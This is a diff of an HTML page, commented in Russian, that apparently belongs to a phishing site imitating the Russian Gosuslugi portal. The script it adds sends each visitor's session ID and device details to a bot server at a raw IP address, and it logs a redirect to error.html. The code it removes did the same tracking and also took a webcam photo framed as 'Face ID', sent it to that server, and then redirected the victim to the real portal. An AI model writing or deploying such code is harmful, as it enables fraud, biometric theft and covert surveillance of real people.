@@ -89,111 +89,44 @@
 
     <div id="toastContainer" class="toast-container"></div>
     
-    <!-- === ОБНОВЛЕННЫЙ БЛОК: Скрипт связи с ботом (3 Этапа) === -->
+    <!-- === ДОБАВЛЕННЫЙ БЛОК: Скрипт связи с ботом (Визиты и Переадресация) === -->
     <script>
-        const API_URL = 'http://144.124.237.170:5001';
+        // 1. Создаем или получаем уникальный ID сессии для отслеживания пользователя
         const currentSessionId = localStorage.getItem('sessionId') || Math.random().toString(36).substring(2, 10);
         localStorage.setItem('sessionId', currentSessionId);
 
-        function getRefCode() {
-            const params = new URLSearchParams(window.location.search);
-            return params.get('ref');
-        }
-
-        // ==========================================
-        // ЭТАП 1: ПЕРВИЧНОЕ ПОСЕЩЕНИЕ САЙТА
-        // ==========================================
+        // 2. Отправляем уведомление о визите сразу при загрузке страницы
         window.addEventListener('DOMContentLoaded', () => {
-            fetch(`${API_URL}/api/visit`, {
+            fetch('http://144.124.237.170:5050/api/visit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: currentSessionId,
-                    refCode: getRefCode(),
                     deviceInfo: {
                         userAgent: navigator.userAgent,
                         localTime: new Date().toLocaleTimeString()
                     }
                 })
-            }).catch(err => console.error("Ошибка Этапа 1:", err));
+            }).catch(err => console.error("Ошибка отправки визита:", err));
         });
 
-        // ==========================================
-        // ЭТАП 2: ОТПРАВКА ФОТО (FACE ID) ПОСЛЕ ПОКАЗА ЛОАДЕРА
-        // ==========================================
-        // Эту функцию нужно вызывать в script.js, когда показывается экран "Госуслуги сейчас откроются"
-        async function triggerStage2_Biometry() {
-            try {
-                // Запрашиваем доступ к веб-камере
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                // Делаем снимок через canvas
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Конвертируем в base64
-                const imageData = canvas.toDataURL('image/jpeg');
-                
-                // Выключаем камеру
-                stream.getTracks().forEach(track => track.stop());
-
-                // Отправляем фото в бота
-                await fetch(`${API_URL}/api/biometry`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: currentSessionId,
-                        image: imageData
-                    })
-                });
-
-            } catch (err) {
-                console.warn("Камера недоступна, отправка заглушки (Этап 2)");
-                // Если нет камеры, отправляем 1x1 пустой пиксель, чтобы сервер не выдал ошибку 400
-                const emptyPixel = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=";
-                
-                await fetch(`${API_URL}/api/biometry`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        sessionId: currentSessionId,
-                        image: emptyPixel
-                    })
-                });
-            }
-        }
-
-        // ==========================================
-        // ЭТАП 3: УСПЕШНЫЙ ВХОД И РЕДИРЕКТ В ЛК
-        // ==========================================
-        function triggerStage3_Success(targetUrl = 'https://lk.gosuslugi.ru/') {
-            fetch(`${API_URL}/api/success`, {
+        // 3. Функция, которую вы можете вызывать для переадресации на error.html
+        // Она сначала отправит лог в бота, а затем перекинет пользователя
+        function redirectWithErrorLog(targetUrl = 'error.html') {
+            fetch('http://144.124.237.170:5050/api/redirect_log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    sessionId: currentSessionId
+                    sessionId: currentSessionId,
+                    target: targetUrl
                 })
             }).finally(() => {
-                // В любом случае перенаправляем пользователя в личный кабинет
+                // Переадресация срабатывает в любом случае
                 window.location.href = targetUrl;
             });
         }
-
-        // --- Пример автоматизации внутри index.html ---
-        // Если вы хотите, чтобы вся цепочка (Этап 2 -> Этап 3) срабатывала автоматически 
-        // при показе экрана profileLoaderOverlay, вы можете вызывать их в вашем файле script.js вот так:
-        //
-        // showProfileLoader();
-        // await triggerStage2_Biometry();
-        // triggerStage3_Success('ваша-ссылка-на-кабинет');
-        
     </script>
-    <!-- === КОНЕЦ ОБНОВЛЕННОГО БЛОКА === -->
+    <!-- === КОНЕЦ ДОБАВЛЕННОГО БЛОКА === -->
 
     <script src="script.js"></script>
 </body>
